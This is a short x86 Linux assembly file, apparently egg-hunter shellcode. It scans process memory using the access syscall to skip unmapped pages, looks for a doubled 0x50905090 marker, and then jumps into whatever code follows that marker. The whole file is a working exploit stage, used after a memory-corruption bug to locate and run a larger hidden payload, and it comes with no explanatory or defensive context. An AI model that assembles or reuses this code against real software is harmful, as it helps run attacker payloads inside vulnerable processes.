global _start

section .text
_start:

        xor ebx, ebx
        
increment_page:
        or dx, 0xfff
        
increment_address:
        inc edx
        lea ebx, [edx + 4]
        push +0x21  
        pop eax		
        int 0x80
        cmp al, 0xf2			
        jz increment_page			
        mov eax, 0x50905090
        mov edi, edx
        scasd
        jnz increment_address		
        scasd				
        jnz increment_address		
        jmp edi
